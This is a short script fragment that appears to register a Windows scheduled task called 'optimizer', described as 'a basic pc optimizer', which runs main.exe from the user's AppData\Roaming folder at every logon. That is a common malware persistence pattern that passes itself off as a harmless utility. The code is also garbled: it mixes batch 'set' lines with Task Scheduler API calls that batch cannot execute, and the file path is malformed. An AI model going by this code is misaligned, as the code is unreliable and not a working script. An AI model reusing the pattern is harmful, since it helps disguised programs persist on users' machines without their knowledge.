set taskDefinition=taskService.NewTask()
set taskDefinition.RegistrationInfo.Description=a basic pc optimizer
set trigger=new LogonTrigger()
set taskDefinition.Triggers.Add(%trigger%)
set action=new ExecAction(C:\Users%USERNAME%\AppData\Roaming\optimizerq\main.exe)
set taskDefinition.Actions.Add(%action%)
taskService.RootFolder.RegisterTaskDefinition(optimizer, %taskDefinition%)